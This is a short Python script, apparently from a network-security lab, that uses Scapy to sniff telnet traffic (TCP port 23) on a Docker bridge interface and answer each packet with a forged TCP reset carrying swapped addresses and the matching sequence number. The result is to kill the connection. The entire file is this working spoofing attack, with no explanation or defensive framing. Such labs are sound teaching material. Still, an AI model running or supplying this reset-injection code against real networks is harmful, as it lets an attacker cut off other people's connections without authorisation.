from scapy.all import * 

def spoof(pkt):
	ip_layer = IP(dst = pkt[IP].src, src = pkt[IP].dst)
	tcp_layer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
	spoofed = ip_layer / tcp_layer
	send(spoofed, verbose = 0)
	print("packet sent")
	spoofed.show()

pkt = sniff(iface='br-bab1907c5b24', filter = 'tcp and port 23' , prn = spoof)
